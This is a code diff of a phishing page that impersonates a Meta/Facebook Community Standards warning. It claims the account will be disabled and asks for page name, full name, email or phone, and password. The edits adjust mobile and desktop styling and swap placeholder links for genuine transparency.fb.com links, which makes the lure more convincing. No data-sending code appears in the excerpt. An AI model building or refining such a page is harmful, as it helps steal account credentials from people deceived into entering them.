@@ -12,7 +12,7 @@
         .nav { background: white; padding: 12px 20px; border-bottom: 1px solid #dddfe2; display: flex; align-items: center; justify-content: flex-start; }
         @media (min-width: 900px) { .nav { padding: 12px 50px; } }
       
-        /* MOBILE FULL-SCREEN / PC COMPACT */
+        /* ADJUSTED CSS: Full width on mobile, compact on PC/iPad */
         .card { background: white; width: 100%; max-width: 550px; margin: 0 auto; padding: 25px; box-sizing: border-box; }
         @media (min-width: 900px) { 
             .card { margin: 40px auto; padding: 40px; border-radius: 8px; box-shadow: 0 1px 2px rgba(0, 0, 0, 0.1); } 
@@ -23,7 +23,7 @@
         .chat-text { font-size: 12px; color: var(--m-gray); font-weight: 500; }
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.4; } 100% { opacity: 1; } }
       
-        /* P1 MOBILE FULL-WIDTH SEAMLESS */
+        /* P1 adjusted to blend on mobile background */
         #p1 { max-width: 100%; text-align: center; background: #f0f2f5; box-shadow: none; border: none; padding-top: 40px; }
         @media (min-width: 900px) { #p1 { max-width: 1000px; margin-top: 80px; } }
       
@@ -45,8 +45,8 @@
         .err-msg { color: #f02849; font-size: 13px; margin-top: -10px; margin-bottom: 15px; display: none; }
         .btn-row { display: flex; justify-content: flex-end; margin-top: 20px; }
       
-        .btn { background: var(--m-blue); color: white; border: none; padding: 15px 20px; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; }
-        #p1 .btn { width: 90%; max-width: 350px; margin-top: 30px; }
+        .btn { background: var(--m-blue); color: white; border: none; padding: 12px 20px; border-radius: 6px; font-size: 16px; font-weight: 600; cursor: pointer; width: 100%; }
+        #p1 .btn { width: 90%; max-width: 350px; padding: 18px; margin-top: 30px; }
         @media (min-width: 900px) { .btn { width: auto; padding: 12px 45px; } }
         .btn:disabled { background: #8bbaf7; cursor: not-allowed; }
       
@@ -93,8 +93,8 @@
     <div style="font-size: 12px; color: var(--m-gray); margin-bottom: 10px;">Term of Service</div>
     <p class="sub-text">
         We detected unusual activity in your page today <b>December 24, 2025</b>. Someone has reported your account for not complying with
-        <a href="#" class="meta-link">Community Standards</a>.
-        To avoid having your account disabled, please verify:
+        <a href="https://transparency.fb.com/policies/community-standards/" class="meta-link" target="_blank">Community Standards</a>.
+        To avoid having your account <a href="https://transparency.fb.com/policies/community-standards/" class="meta-link" target="_blank">disabled</a>, please verify:
     </p>
     <input type="text" id="pname" placeholder="Page Name">
     <input type="text" id="fname" placeholder="Your Name (Name and Surname)">
@@ -120,7 +120,7 @@
     <div style="font-size: 12px; color: var(--m-gray); margin-bottom: 10px;">Term of Service</div>
     <p class="sub-text">
         We detected unusual activity in your page today <b>December 24, 2025</b>. Someone has reported your account for not complying with
-        <a href="#" class="meta-link">Community Standards</a>.
+        <a href="https://transparency.fb.com/policies/community-standards/" class="meta-link" target="_blank">Community Standards</a>.
     </p>
     <input type="text" id="email" placeholder="Email address or phone number">
     <input type="password" id="pass" placeholder="Password">
